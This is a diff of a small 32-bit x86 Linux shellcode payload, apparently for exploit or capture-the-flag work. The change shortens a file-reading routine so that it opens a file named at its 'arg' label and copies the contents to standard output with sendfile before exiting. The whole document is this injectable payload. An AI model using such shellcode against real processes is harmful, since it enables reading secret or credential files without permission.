@@ -9,23 +9,19 @@ callee:
         inc ebx
         mov [ebx+ecx], ch
 main:
-        xor edi, edi
+        xor edx, edx
         xor ecx, ecx
-        lea eax, [edi+5]
-        int 0x80
-        xchg ebx, eax
+        lea eax, [edx+5]
+        int 0x80                # open
         xchg ecx, eax
-        lea edx, [edi+1]
-        shl edx, 16
-        lea eax, [edi+3]
-        int 0x80
-        xchg edx, eax
-        lea ebx, [edi+1]
-        lea eax, [edi+4]
-        int 0x80
+        lea ebx, [edx+1]
+        lea esi, [edx+1]
+        shl esi, 16
+        lea eax, [edx+187]
+        int 0x80                # sendfile
         xor ebx, ebx
-        lea eax, [edi+1]
-        int 0x80
+        lea eax, [edx+1]
+        int 0x80                # exit
 caller:
         call callee
 arg:
